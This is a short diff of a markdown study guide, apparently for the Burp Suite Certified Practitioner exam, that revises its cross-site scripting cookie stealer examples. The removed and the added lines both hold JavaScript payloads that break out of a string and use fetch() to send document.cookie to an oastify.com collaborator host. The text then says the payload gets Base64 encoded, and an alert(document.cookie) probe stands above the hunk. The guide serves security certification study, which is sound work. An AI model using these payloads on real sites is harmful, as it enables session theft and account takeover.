@@ -888,9 +888,9 @@ ${alert(document.cookie)}
 >Below is the main [cookie stealer payload](https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/5cbfeb2a11577ad62a31f72635a000bf5dcce293/payloads/CookieStealer-Payloads.md) before BASE 64 encoding it.  
 
 ```JavaScript
-fetch(`https://OASTIFY.COM/?jsonc=` + window["document"]["cookie"])`
-or
-\"-fetch('https://9jtc6p781p7ydc2rqlsdze8dt4zvn0bp.oastify.com/?cookie='+document.cookie)}//
+Opt1 ==> \"-fetch(`https://OASTIFY.COM/?jsonc=` + window["document"]["cookie"])`//
+Opt2 ==> \"-fetch('https://9jtc6p781p7ydc2rqlsdze8dt4zvn0bp.oastify.com/?cookie='+document.cookie)}//
+Opt3 ==> \"-fetch(`https://9jtc6p781p7ydc2rqlsdze8dt4zvn0bp.oastify.com/?cookie=`+document.cookie)}//
 ```
 
 >Next is encode payload using [Base64 encoded](https://www.base64encode.org/) value of the above cookie stealer payload.  
